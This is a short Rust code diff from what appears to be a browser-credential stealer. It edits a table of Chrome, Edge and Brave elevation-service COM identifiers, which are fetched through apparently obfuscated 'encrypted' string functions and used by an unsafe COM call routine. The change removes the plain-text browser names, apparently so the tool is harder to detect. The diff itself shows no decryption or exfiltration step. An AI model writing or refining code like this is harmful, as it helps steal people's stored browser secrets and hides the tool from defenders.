@@ -294,7 +294,6 @@ unsafe fn try_one(clsid: &[u8], iid: &[u8], enc: &[u8], slots: &[usize]) -> Resu
 }
 
 struct BrowserEntry {
-    name: &'static str,
     clsid_fn: fn() -> String,
     iids_fns: &'static [fn() -> String],
     slots: &'static [usize],
@@ -304,9 +303,9 @@ struct BrowserEntry {
 use crate::encrypted::*;
 
 static BROWSERS: &[BrowserEntry] = &[
-    BrowserEntry { name: "Chrome", clsid_fn: s_elev_chrome_clsid, iids_fns: &[s_elev_chrome_iid1, s_elev_chrome_iid2], slots: &[5, 6, 7, 8], service_fn: s_elev_chrome_svc },
-    BrowserEntry { name: "Edge",   clsid_fn: s_elev_edge_clsid,   iids_fns: &[s_elev_edge_iid1,   s_elev_edge_iid2],   slots: &[5, 6, 7, 8], service_fn: s_elev_edge_svc   },
-    BrowserEntry { name: "Brave",  clsid_fn: s_elev_brave_clsid,  iids_fns: &[s_elev_brave_iid1],                       slots: &[5, 6, 7, 8], service_fn: s_elev_brave_svc  },
+    BrowserEntry { clsid_fn: s_elev_chrome_clsid, iids_fns: &[s_elev_chrome_iid1, s_elev_chrome_iid2], slots: &[5, 6, 7, 8], service_fn: s_elev_chrome_svc },
+    BrowserEntry { clsid_fn: s_elev_edge_clsid,   iids_fns: &[s_elev_edge_iid1,   s_elev_edge_iid2],   slots: &[5, 6, 7, 8], service_fn: s_elev_edge_svc   },
+    BrowserEntry { clsid_fn: s_elev_brave_clsid,  iids_fns: &[s_elev_brave_iid1],                       slots: &[5, 6, 7, 8], service_fn: s_elev_brave_svc  },
 ];
 
 fn hex_to_guid_bytes(hex: &str) -> Vec<u8> {
